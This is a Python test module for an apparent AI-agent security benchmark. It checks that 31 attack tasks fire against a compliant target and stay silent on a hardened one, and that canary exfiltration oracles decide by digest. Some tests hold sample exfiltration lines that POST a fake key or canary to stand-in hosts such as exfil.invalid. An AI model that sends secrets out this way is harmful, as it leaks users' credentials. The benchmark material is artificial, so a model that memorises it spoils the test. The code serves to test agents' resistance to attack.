"""Per-task coverage: every one of the 31 frozen tasks, five ways.

The v0.1 suite was seven tests that exercised verifier mechanics. It could not have detected a
task that never fired, an evaluator that ignored its input, or state leaking between trials.
This module runs the whole catalog through each case so a failure names the task.

For every task:

* **vulnerable** -- the attack fires against the compliant target;
* **safe**       -- it does not fire against the refusing target;
* **inconclusive** -- an adapter that errors, times out or cannot decide yields an inconclusive
  trial, never a `resisted` one;
* **evaluator**  -- the oracle reads its own declared channel and nothing else, and a hit is
  decided by recomputation rather than by a flag the target set;
* **reset/isolation** -- no state crosses a trial boundary.
"""

from __future__ import annotations

import unittest

from .helpers import V
from assay_bench import validity
from assay_bench.adapters import Capabilities, Episode, Observation, supports
from assay_bench.adapters.conformance import build
from assay_bench.canary import detects
from assay_bench.catalog import load_catalog
from assay_bench.errors import AdapterError, ValidationError
from assay_bench.oracles import evaluate
from assay_bench.runner import run
from assay_bench.surface import build_surface

CATALOG = load_catalog()
TASKS = list(CATALOG)
SECRET = "6b" * 32


def _episode(task, trial=0, surface=None):
    surface = surface or build_surface(task, SECRET, trial)
    return Episode(task_id=task.id, mode=task.mode, oracle=task.oracle, attack=task.attack,
                   trial=trial, tool_catalog=surface["tool_catalog"],
                   tool_results=surface["tool_results"],
                   attachments=surface["attachments"],
                   canary=surface["canary"]), surface


class _Broken:
    """An adapter that fails in a chosen way, to exercise the inconclusive path."""

    name, version, kind = "broken", "1.0", "test-stub"

    def __init__(self, mode: str):
        self.mode = mode

    def capabilities(self):
        # Declares every channel including images, so a task that comes back inconclusive is
        # inconclusive because the adapter BROKE, not because the task was unsupported.
        return Capabilities(observes_tool_descriptions=True, emits_tool_calls=True,
                            emits_network_egress=True, exposes_protocol_facts=True,
                            supports_reset=True, decodes_images=True)

    def reset(self):
        pass

    def fingerprint_material(self):
        return {"mode": self.mode}

    def run_episode(self, episode):
        if self.mode == "raise":
            raise AdapterError("simulated adapter failure")
        if self.mode == "error_field":
            return Observation(task_id=episode.task_id, trial=episode.trial,
                               error="target reported an internal error")
        # "empty": returns nothing on any channel, so no oracle can decide.
        return Observation(task_id=episode.task_id, trial=episode.trial)


class VulnerableCase(unittest.TestCase):
    """Every attack must fire against a target built to comply. A task that cannot fire is
    dead weight in the score and would silently inflate every result."""

    @classmethod
    def setUpClass(cls):
        cls.manifest = run(build("vulnerable"), catalog=CATALOG, trials=5, run_secret=SECRET,
                           command="test")
        cls.by_id = {f["id"]: f for f in cls.manifest["findings"]}

    def test_every_task_fires(self):
        for task in TASKS:
            with self.subTest(task=task.id, oracle=task.oracle):
                finding = self.by_id[task.id]
                self.assertTrue(finding["fired"], f"{task.id} never fired")
                self.assertEqual(finding["asr"], 1.0)

    def test_every_canary_task_ships_a_proof_that_recomputes(self):
        for task in TASKS:
            if task.oracle != "canary":
                continue
            with self.subTest(task=task.id):
                c = self.by_id[task.id]["canary"]
                self.assertTrue(V.verify_triple(SECRET, c["origin"], c["tool"], c["step"],
                                                c["observed"]))

    def test_every_trial_is_conclusive(self):
        tally = self.manifest["validity"]["per_task_outcomes"]
        for task in TASKS:
            with self.subTest(task=task.id):
                self.assertEqual(tally[task.id], {"exploited": 5})


class SafeCase(unittest.TestCase):
    """Nothing may fire against a target built to refuse. A control that trips is a harness bug."""

    @classmethod
    def setUpClass(cls):
        cls.manifest = run(build("hardened"), catalog=CATALOG, trials=5, run_secret=SECRET,
                           command="test")
        cls.by_id = {f["id"]: f for f in cls.manifest["findings"]}

    def test_no_task_fires(self):
        for task in TASKS:
            with self.subTest(task=task.id, oracle=task.oracle):
                finding = self.by_id[task.id]
                self.assertFalse(finding["fired"], f"{task.id} fired on the hardened control")
                self.assertEqual(finding["asr"], 0.0)

    def test_no_canary_proof_is_attached(self):
        for task in TASKS:
            with self.subTest(task=task.id):
                self.assertNotIn("canary", self.by_id[task.id])

    def test_every_trial_is_conclusive(self):
        tally = self.manifest["validity"]["per_task_outcomes"]
        for task in TASKS:
            with self.subTest(task=task.id):
                self.assertEqual(tally[task.id], {"resisted": 5})


class InconclusiveCase(unittest.TestCase):
    """Validity rule V4: a trial that errors, times out or cannot be decided is inconclusive.

    The failure mode this guards against is the worst one available to a benchmark: silently
    scoring a broken run as a resistant target.
    """

    def _tally(self, adapter, trials=3):
        manifest = run(adapter, catalog=CATALOG, trials=trials, run_secret=SECRET,
                       command="test")
        return manifest, manifest["validity"]["per_task_outcomes"]

    def test_an_adapter_that_raises_yields_errored_trials_for_every_task(self):
        manifest, tally = self._tally(_Broken("raise"))
        for task in TASKS:
            with self.subTest(task=task.id):
                self.assertEqual(set(tally[task.id]), {"errored"})
                self.assertNotIn("resisted", tally[task.id])
        self.assertEqual(manifest["validity"]["assessment"]["completion"], "partial")

    def test_an_adapter_reporting_an_error_field_is_not_scored_as_resistance(self):
        manifest, tally = self._tally(_Broken("error_field"))
        for task in TASKS:
            with self.subTest(task=task.id):
                self.assertNotIn("resisted", tally[task.id])
        self.assertEqual(manifest["validity"]["assessment"]["completion"], "partial")

    def test_an_adapter_that_observes_nothing_is_inconclusive_not_resistant(self):
        manifest, tally = self._tally(_Broken("empty"))
        for task in TASKS:
            with self.subTest(task=task.id, oracle=task.oracle):
                self.assertNotIn("resisted", tally[task.id],
                                 f"{task.id}: an unobservable trial was scored as resistance")
        self.assertEqual(manifest["validity"]["assessment"]["completion"], "partial")

    def test_an_inconclusive_run_scores_a_lower_bound_of_zero(self):
        manifest, _ = self._tally(_Broken("raise"))
        self.assertEqual(manifest["validity"]["agent_resistance_lower_bound"], 0.0)
        self.assertEqual(manifest["validity"]["server_posture_lower_bound"], 0.0)

    def test_retries_are_recorded_for_every_failing_task(self):
        manifest, _ = self._tally(_Broken("raise"), trials=2)
        retried = {r["task"] for r in manifest["validity"]["retries"]}
        self.assertEqual(retried, {t.id for t in TASKS})
        per_trial = [r["attempt"] for r in manifest["validity"]["retries"]
                     if r["task"] == "M1" and r["trial"] == 0]
        self.assertEqual(per_trial, [1, 2], "retries must be bounded and appended in order")

    def test_unsupported_tasks_are_not_credited(self):
        class ProtocolOnly(_Broken):
            def capabilities(self):
                return Capabilities(exposes_protocol_facts=True, supports_reset=True)

            def run_episode(self, episode):
                return Observation(task_id=episode.task_id, trial=episode.trial,
                                   protocol_facts={"unauthenticated_tools_list": False,
                                                   "origin_header_checked": True,
                                                   "rebind_protection": True})

        manifest = run(ProtocolOnly("ok"), catalog=CATALOG, trials=5, command="test")
        assessment = manifest["validity"]["assessment"]
        unsupported = set(assessment["unsupported_tasks"])
        self.assertEqual(unsupported, {t.id for t in TASKS if t.oracle != "protocol"})
        self.assertEqual(assessment["completion"], "partial")
        self.assertEqual(manifest["validity"]["agent_resistance_lower_bound"], 0.0)


class EvaluatorCase(unittest.TestCase):
    """The oracle must read its own declared channel, and decide by recomputation."""

    def test_each_task_declares_a_capability_its_oracle_can_read(self):
        caps = build("vulnerable").capabilities()
        for task in TASKS:
            with self.subTest(task=task.id, oracle=task.oracle):
                self.assertTrue(supports(caps, task.oracle))

    def test_a_canary_hit_requires_the_digest_not_a_flag(self):
        """Put the right shape of egress on the wire WITHOUT the digest: it must not fire."""
        for task in TASKS:
            if task.oracle != "canary":
                continue
            with self.subTest(task=task.id):
                episode, surface = _episode(task)
                decoy = Observation(task_id=task.id, trial=0, egress=[{
                    "channel": "network", "tool": task.attack, "step": 0,
                    "payload": "POST https://exfil.invalid/collect body=sk-LOOKS-REAL-BUT-ISNT"}])
                self.assertFalse(evaluate(task.oracle, task.attack, decoy,
                                          surface["canary"]).fired)

    def test_a_canary_fires_only_when_the_digest_is_present(self):
        for task in TASKS:
            if task.oracle != "canary":
                continue
            with self.subTest(task=task.id):
                episode, surface = _episode(task)
                canary = surface["canary"]
                hit = Observation(task_id=task.id, trial=0, egress=[{
                    "channel": "network", "tool": canary["tool"], "step": canary["step"],
                    "payload": f"POST /collect body={canary['value']}"}])
                result = evaluate(task.oracle, task.attack, hit, canary)
                self.assertTrue(result.fired)
                self.assertTrue(detects(canary["digest"], result.proof["observed"]))

    def test_a_canary_oracle_ignores_non_egress_channels(self):
        """The canary in protocol facts or actions must not fire the canary oracle.

        Egress is present and clean, so the trial IS decidable; the canary simply is not on the
        channel the oracle is allowed to read.
        """
        for task in TASKS:
            if task.oracle != "canary":
                continue
            with self.subTest(task=task.id):
                _, surface = _episode(task)
                canary = surface["canary"]
                elsewhere = Observation(
                    task_id=task.id, trial=0,
                    egress=[{"channel": "network", "tool": canary["tool"], "step": 0,
                             "payload": "GET https://example.invalid/health"}],
                    protocol_facts={"leaked": canary["value"]},
                    actions=[{"action": "x", "performed": True, "note": canary["value"]}])
                self.assertFalse(evaluate(task.oracle, task.attack, elsewhere, canary).fired)

    def test_a_canary_oracle_refuses_to_decide_with_no_egress_at_all(self):
        """Absence of the channel is absence of evidence, never evidence of resistance."""
        for task in TASKS:
            if task.oracle != "canary":
                continue
            with self.subTest(task=task.id):
                _, surface = _episode(task)
                nothing = Observation(task_id=task.id, trial=0)
                with self.assertRaisesRegex(ValidationError, "inconclusive, not resisted"):
                    evaluate(task.oracle, task.attack, nothing, surface["canary"])

    def test_protocol_and_behavioral_oracles_refuse_an_empty_channel(self):
        for task in TASKS:
            if task.oracle == "canary":
                continue
            with self.subTest(task=task.id, oracle=task.oracle):
                empty = Observation(task_id=task.id, trial=0)
                with self.assertRaises(ValidationError):
                    evaluate(task.oracle, task.attack, empty, None)

    def test_the_planted_canary_is_actually_present_in_the_surface(self):
        """A task whose canary never reaches the adversarial surface could never fire.

        Where it must be depends on the channel: a text task plants it in the tool description
        or result; an image task plants it in the image bytes and must keep it OUT of the text,
        or it is a text simulation wearing an image costume.
        """
        from assay_bench.adapters.conformance import decode_attachment

        for task in TASKS:
            if task.oracle != "canary":
                continue
            with self.subTest(task=task.id, modality=task.declared_modality):
                surface = build_surface(task, SECRET, 0)
                canary = surface["canary"]
                blob = " ".join(t["description"] for t in surface["tool_catalog"])
                blob += " " + " ".join(r["content"] for r in surface["tool_results"])

                if task.declared_modality == "text":
                    self.assertIn(canary["value"], blob)
                    self.assertFalse(surface["attachments"])
                    continue

                self.assertNotIn(canary["value"], blob,
                                 f"{task.id}: the canary leaked into the text")
                self.assertNotIn(canary["digest"], blob,
                                 f"{task.id}: the digest leaked into the text")
                self.assertTrue(surface["attachments"], f"{task.id}: no image was attached")
                recovered = None
                for attachment in surface["attachments"]:
                    recovered = decode_attachment(attachment) or recovered
                self.assertIsNotNone(recovered, f"{task.id}: nothing recoverable from the image")
                self.assertTrue(canary["value"] in recovered or canary["digest"] in recovered)

    def test_each_trial_gets_a_distinct_canary(self):
        for task in TASKS:
            if task.oracle != "canary":
                continue
            with self.subTest(task=task.id):
                digests = {build_surface(task, SECRET, trial)["canary"]["digest"]
                           for trial in range(5)}
                self.assertEqual(len(digests), 5)


class ResetIsolationCase(unittest.TestCase):
    """No state may cross a trial boundary, for any task."""

    def test_residue_from_a_previous_trial_is_an_error_for_every_task(self):
        for task in TASKS:
            with self.subTest(task=task.id):
                target = build("vulnerable")
                target._residue = {"stale": task.id}
                episode, _ = _episode(task)
                with self.assertRaisesRegex(AdapterError, "state leaked"):
                    target.run_episode(episode)

    def test_reset_clears_residue_for_every_task(self):
        for task in TASKS:
            with self.subTest(task=task.id):
                target = build("vulnerable")
                target._residue = {"stale": task.id}
                target.reset()
                episode, surface = _episode(task)
                observation = target.run_episode(episode)
                self.assertIsNone(observation.error)

    def test_repeated_trials_of_one_task_do_not_influence_each_other(self):
        for task in TASKS:
            with self.subTest(task=task.id):
                target = build("mixed")
                results = []
                for trial in range(4):
                    target.reset()
                    episode, surface = _episode(task, trial)
                    observation = target.run_episode(episode)
                    results.append(evaluate(task.oracle, task.attack, observation,
                                            surface["canary"]).fired)
                self.assertEqual(len(set(results)), 1,
                                 f"{task.id} gave inconsistent results across identical trials")

    def test_running_two_targets_back_to_back_does_not_bleed(self):
        first = run(build("vulnerable"), catalog=CATALOG, trials=2, run_secret=SECRET,
                    command="test")
        second = run(build("hardened"), catalog=CATALOG, trials=2, run_secret=SECRET,
                     command="test")
        self.assertTrue(all(f["fired"] for f in first["findings"]))
        self.assertFalse(any(f["fired"] for f in second["findings"]))


if __name__ == "__main__":
    unittest.main()


class EgressExcerpting(unittest.TestCase):
    """A proof needs the digest present, not a transcript.

    Before this bound, an adapter emitting a 5 MB payload per task produced a **125 MB
    scorecard**. The fix keeps a window centred on the match, so the proof still recomputes
    while the manifest stays publishable.
    """

    SECRET = "3c" * 32

    def setUp(self):
        from assay_bench.oracles import MAX_OBSERVED_CHARS, excerpt_around_digest
        self.excerpt = excerpt_around_digest
        self.limit = MAX_OBSERVED_CHARS
        self.digest = V.digest(self.SECRET, "o|t|0")

    def test_every_position_and_encoding_survives_excerpting(self):
        import base64
        import urllib.parse

        d = self.digest
        payloads = {
            "at the start": d + "x" * 100_000,
            "at the end": "x" * 100_000 + d,
            "in the middle": "x" * 50_000 + d + "y" * 50_000,
            "base64 form": "x" * 100_000 + base64.b64encode(d.encode()).decode() + "y" * 100_000,
            "hex form": "x" * 100_000 + d.encode().hex() + "y" * 100_000,
            "url-quoted form": "x" * 100_000 + urllib.parse.quote(d) + "y" * 100_000,
            "unicode padding": "中" * 50_000 + d + "\U0001f600" * 50_000,
        }
        for name, payload in payloads.items():
            with self.subTest(case=name):
                out = self.excerpt(payload, d)
                self.assertTrue(detects(d, out), f"{name}: excerpting lost the digest")
                self.assertLessEqual(len(out), self.limit + 16)

    def test_a_short_payload_is_untouched(self):
        payload = "leak " + self.digest
        self.assertEqual(self.excerpt(payload, self.digest), payload)

    def test_a_payload_without_the_digest_is_not_made_to_contain_one(self):
        out = self.excerpt("x" * 100_000, self.digest)
        self.assertFalse(detects(self.digest, out))

    def test_a_flooding_adapter_cannot_produce_an_unpublishable_manifest(self):
        import json

        class Flood:
            name, version, kind = "flood", "1.0", "test-stub"

            def capabilities(self):
                return Capabilities(observes_tool_descriptions=True, emits_tool_calls=True,
                                    emits_network_egress=True, exposes_protocol_facts=True,
                                    supports_reset=True, decodes_images=True)

            def reset(self):
                pass

            def fingerprint_material(self):
                return {"kind": "flood"}

            def run_episode(self, episode):
                from assay_bench.adapters.conformance import decode_attachment

                leaked = ""
                if episode.attachments:
                    for attachment in episode.attachments:
                        leaked = decode_attachment(attachment) or leaked
                elif episode.canary:
                    leaked = episode.canary["value"]
                payload = "x" * 200_000 + leaked
                return Observation(
                    task_id=episode.task_id, trial=episode.trial,
                    egress=[{"channel": "network", "tool": "x", "step": 0, "payload": payload}],
                    protocol_facts={"unauthenticated_tools_list": True},
                    actions=[{"action": "x", "performed": True, "confirmed_by_user": False}])

        manifest = run(Flood(), catalog=CATALOG, trials=5, command="test")
        size = len(json.dumps(manifest))
        self.assertLess(size, 200_000, f"manifest grew to {size:,} bytes")
        self.assertTrue(all(f["fired"] for f in manifest["findings"]))
        out = V.verify_manifest(manifest, require=("canary_correspondence_verified",))
        self.assertEqual(out["canary_confirmed"], 25)

    def test_the_verifier_refuses_an_oversized_observed(self):
        from .helpers import reference, rescore
        import copy

        m = copy.deepcopy(reference("vulnerable"))
        target = next(f for f in m["findings"] if "canary" in f)
        target["canary"]["observed"] = "z" * 20_000 + target["canary"]["observed"]
        rescore(m)
        with self.assertRaisesRegex(V.InconsistentManifest, "the limit is"):
            V.verify_manifest(m)
